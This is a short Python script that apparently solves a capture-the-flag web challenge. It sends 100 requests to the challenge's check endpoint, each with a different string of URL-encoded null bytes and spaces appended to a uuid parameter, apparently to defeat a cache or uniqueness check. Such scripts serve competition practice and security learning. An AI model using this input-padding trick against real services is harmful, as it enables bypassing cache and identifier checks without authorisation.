import requests

def generate_combination(i):
    binary_str = bin(i)[2:] 
    combination = ''
    for bit in binary_str:
        if bit == '0':
            combination += '%00'
        else:
            combination += '%20'
    return combination

def main():
    uuid = '4ef4332c-3bf4-4c4b-a88a-fecfe9cee647'
    url = 'https://cache-it-to-win-it.chall.lac.tf/check?uuid=' + uuid

    for i in range(100):
        new_url = url + generate_combination(i)
        response = requests.get(new_url)
        print(response.status_code)
        print(response.text)

if __name__ == "__main__":
    main()